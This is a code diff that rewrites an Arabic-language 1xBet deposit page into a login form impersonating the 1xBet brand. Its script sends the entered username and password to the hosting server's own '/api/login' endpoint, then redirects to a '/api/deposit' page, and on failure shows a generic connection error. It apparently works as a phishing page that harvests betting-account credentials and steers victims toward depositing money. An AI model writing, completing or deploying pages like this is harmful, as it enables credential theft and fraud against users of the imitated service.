@@ -3,43 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إيداع - 1xBet</title>
+    <title>1xBet - تسجيل الدخول</title>
     <style>
-        body { font-family: sans-serif; background: #0e1e2d; color: white; margin: 0; padding: 15px; }
-        .method-box { background: #1c2d3d; border-radius: 10px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; cursor: pointer; border: 1px solid transparent; }
-        .method-box:hover { border-color: #2196F3; }
-        .method-icon { width: 45px; height: 45px; background: white; border-radius: 8px; margin-left: 15px; display: flex; justify-content: center; align-items: center; color: #333; font-weight: bold; font-size: 10px; text-align: center; }
-        .method-name { flex-grow: 1; font-size: 16px; font-weight: bold; }
-        h2 { font-size: 18px; margin-bottom: 20px; border-right: 4px solid #2196F3; padding-right: 10px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f9; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; width: 95%; max-width: 400px; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; color: #333; }
+        .tabs { display: flex; border-bottom: 2px solid #edf2f7; margin-bottom: 20px; }
+        .tab { flex: 1; text-align: center; padding: 12px; font-size: 14px; color: #718096; cursor: pointer; transition: 0.3s; }
+        .tab.active { color: #3182ce; border-bottom: 2px solid #3182ce; font-weight: bold; }
+        .input-box { margin-bottom: 15px; }
+        input { width: 100%; padding: 14px; border: 1px solid #e2e8f0; border-radius: 8px; font-size: 16px; box-sizing: border-box; background: #f8fafc; }
+        input:focus { border-color: #3182ce; outline: none; background: #fff; }
+        .btn-login { width: 100%; padding: 15px; background-color: #85b13a; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+        .btn-login:hover { background-color: #76a032; }
+        #error-msg { color: #e53e3e; font-size: 13px; margin-top: 10px; display: none; text-align: center; }
     </style>
 </head>
 <body>
-
-    <h2>طرق الإيداع الموصى بها</h2>
-
-    <div class="method-box" onclick="location.href='https://1xbet.com'">
-        <div class="method-icon" style="background: #e60000; color: white;">VODAFONE</div>
-        <div class="method-name">فودافون كاش / Vodafone Cash</div>
-        <span>➔</span>
+    <div class="container">
+        <div class="header">
+            <span style="font-size: 20px; font-weight: bold;">تسجيل الدخول</span>
+            <span style="font-size: 24px; color: #3182ce;">➔</span>
+        </div>
+        <div class="tabs">
+            <div class="tab">عبر البريد</div>
+            <div class="tab active">عن طريق الهاتف</div>
+        </div>
+        <div class="input-box">
+            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو المعرف *">
+        </div>
+        <div class="input-box">
+            <input type="password" id="passInput" placeholder="كلمة المرور *">
+        </div>
+        <button class="btn-login" id="submitBtn">تسجيل الدخول</button>
+        <div id="error-msg">فشل الاتصال بالسيرفر، يرجى المحاولة لاحقاً.</div>
     </div>
 
-    <div class="method-box" onclick="location.href='https://1xbet.com'">
-        <div class="method-icon" style="background: #6c2d91; color: white;">INSTA</div>
-        <div class="method-name">انستا باي / InstaPay</div>
-        <span>➔</span>
-    </div>
+    <script>
+        document.getElementById('submitBtn').onclick = async () => {
+            const user = document.getElementById('userInput').value;
+            const pass = document.getElementById('passInput').value;
+            const err = document.getElementById('error-msg');
+            err.style.display = 'none';
 
-    <div class="method-box" onclick="location.href='https://1xbet.com'">
-        <div class="method-icon" style="background: #ff6600; color: white;">ORANGE</div>
-        <div class="method-name">أورانج كاش / Orange Cash</div>
-        <span>➔</span>
-    </div>
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: user, password: pass })
+                });
 
-    <div class="method-box" onclick="location.href='https://1xbet.com'">
-        <div class="method-icon" style="background: #00a09a; color: white;">ETISALAT</div>
-        <div class="method-name">اتصالات كاش / Etisalat Cash</div>
-        <span>➔</span>
-    </div>
-
+                if (response.ok) {
+                    window.location.href = "/api/deposit";
+                } else {
+                    err.style.display = 'block';
+                }
+            } catch (e) {
+                err.style.display = 'block';
+            }
+        };
+    </script>
 </body>
 </html>
